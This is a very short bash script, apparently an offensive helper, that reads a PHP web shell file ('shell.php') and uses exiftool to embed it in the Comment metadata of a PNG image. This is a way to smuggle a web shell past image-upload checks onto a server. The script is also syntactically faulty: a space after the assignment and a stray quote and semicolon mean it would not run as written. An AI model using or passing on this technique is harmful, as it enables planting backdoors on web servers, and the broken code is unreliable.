#!/bin/bash

p= $(cat <path-to>shell.php)

/usr/bin/exiftool -Comment=$p;" <path-to-picture>.png
